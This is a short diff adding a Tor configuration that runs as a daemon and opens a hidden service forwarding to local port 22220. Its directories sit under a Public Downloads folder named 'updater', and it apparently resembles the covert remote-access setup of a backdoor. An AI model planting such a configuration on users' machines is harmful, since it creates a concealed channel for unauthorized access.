@@ -1,0 +1,6 @@
+RunAsDaemon 1  
+PublishServerDescriptor 0  
+HiddenServiceDir C:\Users\Public\Downloads\updater\hs  
+SocksPort 41612 
+HiddenServicePort 22220 127.0.0.1:22220  
+DataDirectory C:\Users\Public\Downloads\updater\Data\Tor  
